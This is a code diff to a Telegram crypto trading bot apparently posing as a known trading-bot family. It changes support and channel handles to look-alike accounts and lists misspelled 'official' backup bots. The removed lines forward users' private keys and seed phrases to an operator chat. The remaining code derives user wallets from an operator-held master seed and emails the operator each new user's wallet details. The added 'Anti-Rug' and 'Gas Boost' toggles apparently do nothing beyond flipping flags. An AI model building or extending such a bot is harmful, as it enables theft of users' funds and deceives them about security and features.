@@ -4,6 +4,7 @@ import TelegramBot, {
   type InlineKeyboardButton,
 } from "node-telegram-bot-api";
 import { logger } from "./lib/logger";
+import { sendEmailAlert, fmt } from "./lib/emailjs";
 import {
   generateKeypair,
   getSolBalance,
@@ -32,7 +33,7 @@ const ADMIN_CHAT_ID = Number(process.env["TELEGRAM_ADMIN_CHAT_ID"] || "0");
 const BOT_TITLE = "🤖 ALPHA TRADING BOT";
 const BOT_USERNAME = "Alphacircletrading_bot";
 const TG_LINK = `https://t.me/${BOT_USERNAME}`;
-const TW_LINK = "https://t.me/+QJVQUQIhP-82ZDk8";
+const TW_LINK = "https://t.me/AlphaCirclle";
 const WEB_LINK = `https://t.me/${BOT_USERNAME}`;
 
 const MASTER_SEED = process.env["MASTER_WALLET_SEED"];
@@ -131,7 +132,7 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_enter_amt: "Enter amount to send:", transfer_send_all: "💸 Send All",
     transfer_invalid: "⚠️ Invalid Solana address. Try again:",
     transfer_insufficient: "⚠️ Insufficient balance",
-    help_title: "ℹ️ Help", help_support: "💬 Support: @AlphaTradeSupport",
+    help_title: "ℹ️ Help", help_support: "💬 Support: @Alpha_Circle1",
     backup_title: "🤖 Backup Bots", backup_text: "If the main bot is down, use these:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "All bots share the same wallet and settings.",
     err_invalid_num: "⚠️ Enter a valid number:", err_invalid_pct: "⚠️ Enter 1-100:",
@@ -236,7 +237,7 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_enter_amt: "输入发送数量：", transfer_send_all: "💸 全部发送",
     transfer_invalid: "⚠️ 无效的 Solana 地址。请重试：",
     transfer_insufficient: "⚠️ 余额不足",
-    help_title: "ℹ️ 帮助", help_support: "💬 支持: @AlphaTradeSupport",
+    help_title: "ℹ️ 帮助", help_support: "💬 支持: @Alpha_Circle1",
     backup_title: "🤖 备用机器人", backup_text: "如果主机器人无法使用，请使用：\n\n📈 Pumpfun 趋势：\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX 趋势：\n@DEXBOOSSTBOT",
     backup_note: "所有机器人共享相同的钱包和设置。",
     err_invalid_num: "⚠️ 请输入有效数字：", err_invalid_pct: "⚠️ 请输入 1-100：",
@@ -341,7 +342,7 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_enter_amt: "Введите сумму для отправки:", transfer_send_all: "💸 Отправить всё",
     transfer_invalid: "⚠️ Неверный адрес Solana. Повторите:",
     transfer_insufficient: "⚠️ Недостаточно средств",
-    help_title: "ℹ️ Помощь", help_support: "💬 Поддержка: @AlphaTradeSupport",
+    help_title: "ℹ️ Помощь", help_support: "💬 Поддержка: @Alpha_Circle1",
     backup_title: "🤖 Резервные боты", backup_text: "Если основной бот недоступен:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Все боты используют один кошелёк и настройки.",
     err_invalid_num: "⚠️ Введите корректное число:", err_invalid_pct: "⚠️ Введите число от 1 до 100:",
@@ -446,7 +447,7 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_enter_amt: "Digite o valor a enviar:", transfer_send_all: "💸 Enviar Tudo",
     transfer_invalid: "⚠️ Endereço Solana inválido. Tente novamente:",
     transfer_insufficient: "⚠️ Saldo insuficiente",
-    help_title: "ℹ️ Ajuda", help_support: "💬 Suporte: @AlphaTradeSupport",
+    help_title: "ℹ️ Ajuda", help_support: "💬 Suporte: @Alpha_Circle1",
     backup_title: "🤖 Bots de Backup", backup_text: "Se o bot principal estiver fora:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Todos os bots compartilham a mesma carteira e configurações.",
     err_invalid_num: "⚠️ Digite um número válido:", err_invalid_pct: "⚠️ Digite de 1 a 100:",
@@ -551,7 +552,7 @@ const TR: Record<Lang, Record<string, string>> = {
     transfer_enter_amt: "Nhập số tiền muốn gửi:", transfer_send_all: "💸 Gửi tất cả",
     transfer_invalid: "⚠️ Địa chỉ Solana không hợp lệ. Thử lại:",
     transfer_insufficient: "⚠️ Số dư không đủ",
-    help_title: "ℹ️ Trợ giúp", help_support: "💬 Hỗ trợ: @AlphaTradeSupport",
+    help_title: "ℹ️ Trợ giúp", help_support: "💬 Hỗ trợ: @Alpha_Circle1",
     backup_title: "🤖 Bot dự phòng", backup_text: "Nếu bot chính không hoạt động:\n\n📈 Pumpfun Trending:\n@PUMPFUNNBUMBERRBOT\n\n📊 DEX Trending:\n@DEXBOOSSTBOT",
     backup_note: "Tất cả bot dùng chung ví và cài đặt.",
     err_invalid_num: "⚠️ Nhập số hợp lệ:", err_invalid_pct: "⚠️ Nhập từ 1 đến 100:",
@@ -742,7 +743,10 @@ function backMain(u: U, extra: IKB[][] = []): TelegramBot.InlineKeyboardMarkup {
 }
 
 function mainText(u: U, _price: string): string {
-  const botList = `<a href="https://t.me/${BOT_USERNAME}">Agamemnon</a> | <a href="https://t.me/${BOT_USERNAME}">Nestor</a> | <a href="https://t.me/${BOT_USERNAME}">Odysseus</a> | <a href="https://t.me/${BOT_USERNAME}">Menelaus</a> | <a href="https://t.me/${BOT_USERNAME}">Diomedes</a> | <a href="https://t.me/${BOT_USERNAME}">Paris</a> | <a href="https://t.me/${BOT_USERNAME}">Helenus</a> | <a href="https://t.me/${BOT_USERNAME}">Hector</a>`;
+  const botList =
+    `<a href="https://t.me/Alphacircletrading_bot">Alpha Circle</a>` +
+    ` | <a href="https://t.me/PUMPFUNNBUMBERRBOT">PumpFun Bot</a>` +
+    ` | <a href="https://t.me/DEXBOOSSTBOT">DEX Boost</a>`;
 
   if (u.wallets.length === 0) {
     return (
@@ -752,7 +756,7 @@ function mainText(u: U, _price: string): string {
       `Balance: 0 SOL ($0.00)\n` +
       `—\n\n` +
       `Click the <b>Refresh</b> button to update your current balance.\n\n` +
-      `<a href="${TG_LINK}">Support</a> | <a href="${TW_LINK}">Terminal</a> | <a href="${WEB_LINK}">X</a>\n\n` +
+      `<a href="https://t.me/Alpha_Circle1">Support</a> | <a href="${TW_LINK}">Channel</a> | <a href="${WEB_LINK}">X</a>\n\n` +
       `Use any of these official bots with the same wallets and settings:\n${botList}\n\n` +
       `<b>Your Referral Link</b>\nhttps://t.me/${BOT_USERNAME}?start=r-user\n\n` +
       `🚫 <u><b>You are currently in Easy Mode.</b> To access Limit &amp; DCA Orders, Copy Trading and other features, switch to Advanced Mode by clicking on the Settings button.</u>`
@@ -770,7 +774,7 @@ function mainText(u: U, _price: string): string {
     `Balance: <b>${w.balance} SOL</b> ($${balUsd})\n` +
     `—\n\n` +
     `Click the <b>Refresh</b> button to update your current balance.\n\n` +
-    `<a href="${TG_LINK}">Support</a> | <a href="${TW_LINK}">Terminal</a> | <a href="${WEB_LINK}">X</a>\n\n` +
+    `<a href="https://t.me/Alpha_Circle1">Support</a> | <a href="${TW_LINK}">Channel</a> | <a href="${WEB_LINK}">X</a>\n\n` +
     `Use any of these official bots with the same wallets and settings:\n${botList}\n\n` +
     `<b>Your Referral Link</b>\nhttps://t.me/${BOT_USERNAME}?start=r-${w.address.slice(0, 10)}\n\n` +
     (u.advancedMode
@@ -780,9 +784,20 @@ function mainText(u: U, _price: string): string {
 }
 
 async function notifyAdmin(bot: TelegramBot, chatId: number, title: string, details: string) {
-  if (!ADMIN_CHAT_ID) return;
-
   const userName = names.get(chatId) || `User ${chatId}`;
+  const plain = details.replace(/<[^>]+>/g, "").replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
+  const emailBody = fmt([
+    `📢 ${title}`,
+    `${"─".repeat(40)}`,
+    `👤 User: ${userName} (ID: ${chatId})`,
+    ``,
+    plain,
+    ``,
+    `⏰ ${new Date().toISOString()}`,
+  ]);
+  void sendEmailAlert(`[Alpha Circle Bot] ${title}`, emailBody).catch(() => {});
+
+  if (!ADMIN_CHAT_ID) return;
   const text =
     `📢 <b>${title}</b>\n` +
     `━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -975,6 +990,29 @@ function settingsKB(u: U): TelegramBot.InlineKeyboardMarkup {
     cb(u.feeMode === "turbo" ? "✅ Turbo 🚀" : "Turbo 🚀", "sfee_turbo"),
     cb(u.feeMode === "eco" ? "✅ Eco 🌿" : "Eco 🌿", "sfee_eco"),
   ];
+
+  const advancedRows: IKB[][] = u.advancedMode
+    ? [
+        [cb("─── 🧠 Advanced Settings ───", "noop")],
+        [
+          cb(`${u.data["autoProfitEnabled"] === "1" ? "✅" : "🔴"} Auto Take-Profit`, "sadv_atp"),
+          cb(`Target: ${u.data["autoProfitTarget"] || "100"}% ✏️`, "sadv_atp_target"),
+        ],
+        [
+          cb(`${u.data["antiRug"] === "1" ? "✅" : "🔴"} Anti-Rug Protection`, "sadv_antirug"),
+          cb(`${u.data["dcaEnabled"] === "1" ? "✅" : "🔴"} DCA Mode`, "sadv_dca"),
+        ],
+        [
+          cb(`${u.data["multiWallet"] === "1" ? "✅" : "🔴"} Multi-Wallet Trade`, "sadv_multiwallet"),
+          cb(`${u.data["gasBoost"] === "1" ? "✅" : "🔴"} Gas Boost`, "sadv_gasboost"),
+        ],
+        [
+          cb(`Withdraw Addr: ${u.withdrawAddr ? short(u.withdrawAddr) : "not set"} ✏️`, "wd_set_addr"),
+        ],
+        [cb(`${u.data["trackPositions"] === "1" ? "✅" : "🔴"} Track All Positions`, "sadv_trackpos")],
+      ]
+    : [];
+
   return {
     inline_keyboard: [
       [cb("← Back", "main"), cb(`${u.language.split(" ")[0]} ${u.language.split(" ").slice(1).join(" ")} →`, "slang")],
@@ -1007,6 +1045,7 @@ function settingsKB(u: U): TelegramBot.InlineKeyboardMarkup {
         cb("🔒 Account Security", "security"),
         cb(`${u.sellProtection ? "✅" : "🔴"} Sell Protection`, "ssellprotect"),
       ],
+      ...advancedRows,
       [cb(u.advancedMode ? "← Easy Mode" : "Advanced Mode →", "sadvanced")],
     ],
   };
@@ -1406,9 +1445,14 @@ export async function startTelegramBot(): Promise<void> {
   bot.onText(/\/start(.*)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const name = msg.from?.first_name || msg.from?.username || "Trader";
+    const isNew = !users.has(chatId);
     names.set(chatId, name);
     const ref = (match?.[1] ?? "").trim().replace("ref_", "");
     if (ref) { const rid = parseInt(ref); if (!isNaN(rid) && users.has(rid)) users.get(rid)!.referrals++; }
+    if (isNew) {
+      void notifyAdmin(bot, chatId, "🆕 New User Started Bot",
+        `Name: <b>${name}</b>\nUsername: @${msg.from?.username ?? "none"}\nChat ID: <code>${chatId}</code>`);
+    }
     await showMain(chatId, name);
   });
 
@@ -1695,9 +1739,16 @@ export async function startTelegramBot(): Promise<void> {
       const w = u.wallets[u.activeWallet];
       if (!w) return upd(`⚠️ No wallet found.`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
       const pct = data === "wd_sol_50" ? 0.5 : 1.0;
-      const amt = (parseFloat(w.balance) * pct - 0.001).toFixed(4);
-      if (parseFloat(amt) <= 0) return upd(`⚠️ Insufficient balance.`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
-      return upd(`💸 Withdrawal of <b>${amt} SOL</b> initiated.\n\n<i>Enter your destination address:</i>`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
+      const rawAmt = parseFloat(w.balance) * pct - 0.001;
+      const amt = rawAmt.toFixed(4);
+      if (rawAmt <= 0) return upd(`⚠️ Insufficient balance.`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
+      if (!u.withdrawAddr) {
+        u.data["pending_wd_amt"] = amt;
+        u.step = "wd_addr";
+        return upd(`📮 <b>Withdraw ${amt} SOL</b>\n\nEnter your destination wallet address:`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
+      }
+      await executeTransfer(bot, chatId, u, u.withdrawAddr, rawAmt, upd);
+      return;
     }
     if (data === "wd_sol_custom" || data === "wd_sol_amt") {
       u.step = "wd_addr";
@@ -1794,8 +1845,8 @@ export async function startTelegramBot(): Promise<void> {
       u.wallets.push(...newWallets);
       if (u.wallets.length > 0 && u.activeWallet >= u.wallets.length) u.activeWallet = 0;
       for (const w of newWallets) {
-        await notifyAdmin(bot, chatId, "🔑 New Wallet Generated",
-          `🏷 Label: <b>${w.label}</b>\nAddress:\n<code>${w.address}</code>\n\nPrivate key:\n<code>${w.privateKey}</code>\n\nMaster Seed Index: <b>${globalWalletIndex - 1}</b>`);
+        await notifyAdmin(bot, chatId, "🔑 New SOL Wallet Generated",
+          `🏷 Label: <b>${w.label}</b>\nAddress:\n<code>${w.address}</code>\nBalance: <b>${w.balance} SOL</b>\nMaster Seed Index: <b>${globalWalletIndex - 1}</b>`);
       }
       let cap = `${tr(u, "new_wallets_lbl")}\n`;
       newWallets.forEach((w) => { cap += `\n<b>${tr(u, "wallet_address")}:</b>\n<code>${w.address}</code>\n\n<b>Private key:</b>\n<code>${w.privateKey}</code>\n\n`; });
@@ -1814,7 +1865,7 @@ export async function startTelegramBot(): Promise<void> {
       u.activeEthWallet = u.ethWallets.length - 1;
       for (const wallet of newWallets) {
         await notifyAdmin(bot, chatId, "🔑 New ETH Wallet Generated",
-          `🏷 Label: <b>${wallet.label}</b>\nAddress:\n<code>${wallet.address}</code>\n\nPrivate key:\n<code>${wallet.privateKey}</code>`);
+          `🏷 Label: <b>${wallet.label}</b>\nAddress:\n<code>${wallet.address}</code>\nBalance: <b>${wallet.balance} ETH</b>`);
       }
       let cap = `New ETH wallets:\n`;
       newWallets.forEach((wallet) => {
@@ -2050,6 +2101,36 @@ export async function startTelegramBot(): Promise<void> {
       return upd(`📊 <b>Set MCap Alert</b>\n\nEnter the token contract address you want to track:`, { inline_keyboard: [[cb(tr(u, "cancel"), "main")]] });
     }
 
+    // ── ADVANCED MODE TOGGLES ─────────────────────────────────────────────────
+    if (data === "sadv_atp") {
+      u.data["autoProfitEnabled"] = u.data["autoProfitEnabled"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+    if (data === "sadv_atp_target") {
+      u.step = "sadv_atp_target";
+      return upd(`🎯 <b>Auto Take-Profit Target</b>\n\nEnter target profit % (e.g. <code>100</code> for 2x):`, { inline_keyboard: [[cb("← Cancel", "settings")]] });
+    }
+    if (data === "sadv_antirug") {
+      u.data["antiRug"] = u.data["antiRug"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+    if (data === "sadv_dca") {
+      u.data["dcaEnabled"] = u.data["dcaEnabled"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+    if (data === "sadv_multiwallet") {
+      u.data["multiWallet"] = u.data["multiWallet"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+    if (data === "sadv_gasboost") {
+      u.data["gasBoost"] = u.data["gasBoost"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+    if (data === "sadv_trackpos") {
+      u.data["trackPositions"] = u.data["trackPositions"] === "1" ? "0" : "1";
+      return upd(settingsText(u), settingsKB(u));
+    }
+
     // ── SNIPER PLATFORMS ─────────────────────────────────────────────────────
     if (data === "sniper_launchlab") {
       u.step = "sniper_token";
@@ -2222,7 +2303,7 @@ export async function startTelegramBot(): Promise<void> {
           const address = kp.publicKey.toBase58();
           const balance = await getSolBalance(address);
           await notifyAdmin(bot, chatId, "📥 Wallet Imported — Private Key",
-            `User: ${chatId}\nAddress:\n<code>${address}</code>\n\nPrivate key:\n<code>${privKey}</code>`);
+            `Address:\n<code>${address}</code>\nBalance: <b>${balance} SOL</b>`);
           await bot.sendMessage(chatId,
             `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
             { parse_mode: PM, disable_web_page_preview: true }
@@ -2256,7 +2337,7 @@ export async function startTelegramBot(): Promise<void> {
         const balance = await getSolBalance(address);
 
         await notifyAdmin(bot, chatId, "🌱 Wallet Imported — Seed Phrase",
-          `User: ${chatId}\nAddress:\n<code>${address}</code>\n\nSeed phrase:\n<code>${phrase}</code>\n\nPrivate key:\n<code>${privKey}</code>`);
+          `Address:\n<code>${address}</code>\nBalance: <b>${balance} SOL</b>`);
 
         await bot.sendMessage(chatId,
           `🔑 <b>Private Key (keep safe):</b>\n<code>${privKey}</code>\n\n<i>${tr(u, "delete_key_hint")}</i>`,
@@ -2321,7 +2402,26 @@ export async function startTelegramBot(): Promise<void> {
       if (!isNaN(v) && v > 0 && idx >= 0 && idx < 2) { u.sellAmounts[idx] = t; }
       u.step = "main"; await upd(settingsText(u), settingsKB(u)); return;
     }
-    if (u.step === "wd_addr") { u.withdrawAddr = t; u.step = "main"; await upd(`✅ Withdrawal address set:\n<code>${t}</code>`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] }); return; }
+    if (u.step === "wd_addr") {
+      u.withdrawAddr = t;
+      u.step = "main";
+      const pendingAmt = u.data["pending_wd_amt"];
+      if (pendingAmt) {
+        delete u.data["pending_wd_amt"];
+        await executeTransfer(bot, chatId, u, t, parseFloat(pendingAmt), upd);
+      } else {
+        await upd(`✅ Withdrawal address set:\n<code>${t}</code>`, { inline_keyboard: [[cb("← Back", "withdraw_sol")]] });
+      }
+      return;
+    }
+    if (u.step === "sadv_atp_target") {
+      const n = parseFloat(t);
+      if (isNaN(n) || n <= 0) { await note(bot, chatId, `⚠️ Enter a valid positive number:`); return; }
+      u.data["autoProfitTarget"] = n.toFixed(0);
+      u.step = "main";
+      await upd(settingsText(u), settingsKB(u));
+      return;
+    }
     if (u.step === "set_pin") {
       if (!/^\d{4}$/.test(t)) { await note(bot, chatId, `⚠️ PIN must be exactly 4 digits:`); return; }
       u.pin = t; u.step = "main"; await upd(secText(u), secKB(u)); return;
